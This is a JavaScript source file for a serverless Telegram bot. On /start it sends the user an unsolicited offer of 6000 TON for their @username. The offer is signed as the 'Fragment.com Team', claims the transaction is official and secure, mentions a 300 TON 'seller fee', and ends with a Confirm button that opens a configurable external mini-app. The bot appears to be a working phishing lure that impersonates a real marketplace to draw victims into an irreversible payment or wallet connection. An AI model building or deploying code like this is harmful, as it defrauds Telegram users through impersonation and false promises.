const { Telegraf } = require('telegraf');

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const WEBAPP_URL = process.env.WEBAPP_URL || 'https://your-domain.com';

if (!BOT_TOKEN) {
  console.error('Missing TELEGRAM_BOT_TOKEN environment variable');
}

// Create bot instance only once per cold start
const bot = new Telegraf(BOT_TOKEN || ''); // empty string if missing, will just no-op

// /start command – welcome μήνυμα (στυλ NftAlertsBot, δυναμικό @username)
bot.start((ctx) => {
  const username = ctx.from?.username;

  // Αν δεν υπάρχει username, μην δείχνεις offer & Confirm
  if (!username) {
    const fallbackMessage =
      `No offer or username was found for this account.\n\n` +
      `Please make sure you have a Telegram @username set and try again.`;

    return ctx.reply(fallbackMessage);
  }

  const displayName = `@${username}`;
  const message =
    `👋 Hi, ${displayName}\n\n` +
    `We'd like to present you with a direct buy offer for your distinctive username.\n\n` +
    `The transaction will be processed through the official 🔐 Fragment.com service, ensuring full security and automatic, trustless execution.\n\n` +
    `📄 Offer details:\n\n` +
    `💰 Amount offered: 6000 TON\n` +
    `🪙 Buyer fee: 5% (paid by the buyer)\n` +
    `🪙 Seller fee: 300 TON\n\n` +
    `⚠️ Important:\n\n` +
    `• After confirmation, ${displayName} will be issued as a collectible.\n` +
    `• The transfer is permanent and cannot be reversed.\n` +
    `• If you do not wish to sell, you may safely ignore this notification.\n\n` +
    `💡 Why accept:\n\n` +
    `• Secure by design: handled entirely within Fragment.com.\n` +
    `• Fast payout: funds arrive instantly on-chain once completed.\n` +
    `• Monetization: turn a rare username into a tangible asset.\n\n` +
    `✅ Tap "Confirm agreement" to proceed in the mini-app.\n\n` +
    `Best regards,\n` +
    `Fragment.com Team`;

  return ctx.reply(message, {
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: '✅ Confirm',
            web_app: { url: WEBAPP_URL }
          }
        ]
      ]
    }
  });
});

// Vercel serverless handler
module.exports = async (req, res) => {
  if (req.method === 'POST') {
    try {
      await bot.handleUpdate(req.body);
      return res.status(200).json({ ok: true });
    } catch (err) {
      console.error('Error handling update', err);
      return res.status(500).json({ ok: false });
    }
  }

  // Για GET requests (π.χ. health check από browser)
  return res.status(200).send('Telegram bot is running on Vercel.');
};

